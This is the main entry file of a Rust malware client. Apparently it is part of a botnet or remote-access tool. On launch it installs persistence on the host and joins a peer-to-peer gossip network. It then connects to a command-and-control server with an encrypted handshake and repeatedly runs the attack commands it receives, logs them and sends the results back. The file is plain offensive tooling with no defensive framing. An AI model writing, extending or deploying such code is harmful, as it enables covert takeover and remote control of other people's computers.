#![forbid(unsafe_code)]

mod config;
mod communication;
mod commands;
mod crypto;
mod error;
mod persistence;
mod attacks;
mod encryption;
mod utils;
mod p2p;
mod agentic;
mod recon;
mod compute;
mod db;

use config::FullConfig;
use db::ClientDb;
use communication::connect_to_c2;
use persistence::add_persistence;
use attacks::execute_attack;
use commands::CommandResult;
use error::handle_error;
use tokio::runtime::Runtime;
use std::sync::Arc;

fn main() {
    let config = FullConfig::load();
    add_persistence();

    let db = Arc::new(
        ClientDb::open(&config.database.path)
            .unwrap_or_else(|_| ClientDb::open_memory().expect("in-memory db"))
    );

    let rt = Runtime::new().unwrap();
    rt.block_on(async {
        if config.p2p.enabled {
            let gossip_addr: std::net::SocketAddr = config.p2p.gossip_address.parse()
                .expect("Invalid P2P gossip address");
            let bootstrap: Vec<std::net::SocketAddr> = config.p2p.bootstrap_peers.iter()
                .filter_map(|s| s.parse().ok())
                .collect();
            let peer_mgr = Arc::new(
                p2p::peer::PeerManager::new(gossip_addr, bootstrap, config.p2p.max_peers)
            );
            match p2p::gossip::GossipEngine::new(gossip_addr, peer_mgr).await {
                Ok(engine) => {
                    let engine = Arc::new(engine);
                    engine.start();
                    eprintln!("[*] P2P gossip: {}", config.p2p.gossip_address);
                }
                Err(e) => eprintln!("[!] P2P failed: {}", e),
            }
        }

        match connect_to_c2(&config.settings).await {
            Ok(mut socket) => {
                let handshake = match crypto::handshake::client_handshake(&mut socket).await {
                    Ok(h) => h,
                    Err(e) => {
                        eprintln!("[!] PQ handshake failed: {}", e);
                        return;
                    }
                };
                let key = handshake.session_key;
                eprintln!("[+] PQ session established");

                loop {
                    let command = match communication::receive_command(&mut socket, &key).await {
                        Ok(cmd) => cmd,
                        Err(e) => {
                            handle_error(e);
                            break;
                        }
                    };

                    let _ = db.insert_command(command.id, &command.command, &command.args);

                    let result_str = match execute_attack(&command).await {
                        Ok(data) => data,
                        Err(e) => format!("Error: {}", e),
                    };

                    let _ = db.update_command_result(command.id, &result_str);

                    let result = CommandResult {
                        id: command.id,
                        result: result_str,
                    };

                    if let Err(e) = communication::send_result(&mut socket, &result, &key).await {
                        handle_error(e);
                        break;
                    }
                }
            }
            Err(e) => handle_error(e),
        }
    });
}
